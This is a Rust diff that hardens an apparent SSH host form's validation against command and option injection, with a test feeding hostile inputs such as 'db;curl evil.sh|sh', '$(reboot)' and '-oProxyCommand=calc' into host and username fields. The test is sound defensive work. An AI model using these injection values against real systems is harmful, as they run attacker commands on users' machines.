@@ -124,8 +124,8 @@ impl HostDraft {
         let address = self.address.trim();
         if address.is_empty() {
             problem(Field::Address, "Host is required");
-        } else if address.contains(char::is_whitespace) {
-            problem(Field::Address, "Host can't contain spaces");
+        } else if let Some(reason) = crate::host::address_problem(address) {
+            problem(Field::Address, &format!("Host {reason}"));
         }
         let port = self
             .port
@@ -150,6 +150,9 @@ impl HostDraft {
                 problem(Field::User, "Username is required");
             } else if user.contains(char::is_whitespace) {
                 problem(Field::User, "Username can't contain spaces");
+            } else if user.starts_with('-') {
+                // `ssh -oProxyCommand=…@host` runs a command.
+                problem(Field::User, "Username can't start with -");
             }
             if let Auth::Key(path) = &self.auth {
                 if path.as_os_str().is_empty() {
@@ -339,6 +342,40 @@ mod tests {
                 Field::User,
                 Field::Key
             ]
+        );
+    }
+
+    #[test]
+    fn refuses_what_would_read_as_more_than_a_name() {
+        let vault = Vault::sample();
+        let problems = |address: &str, user: &str| {
+            let mut draft = HostDraft::new("Production");
+            draft.name = "new".into();
+            draft.address = address.into();
+            draft.user = user.into();
+            match draft.check(&vault, None) {
+                Ok(_) => Vec::new(),
+                Err(problems) => problems
+                    .into_iter()
+                    .map(|problem| problem.message)
+                    .collect(),
+            }
+        };
+        assert!(problems("db.example.com", "deploy").is_empty());
+        assert!(problems("fe80::1%eth0", r"CORP\deploy").is_empty());
+        assert_eq!(
+            problems("db;curl evil.sh|sh", "deploy"),
+            ["Host can't contain ;"]
+        );
+        assert_eq!(problems("$(reboot)", "deploy"), ["Host can't contain $"]);
+        assert_eq!(problems("a,github.com", "deploy"), ["Host can't contain ,"]);
+        assert_eq!(
+            problems("-oProxyCommand=x", "deploy"),
+            ["Host can't start with -"]
+        );
+        assert_eq!(
+            problems("db", "-oProxyCommand=calc"),
+            ["Username can't start with -"]
         );
     }
 
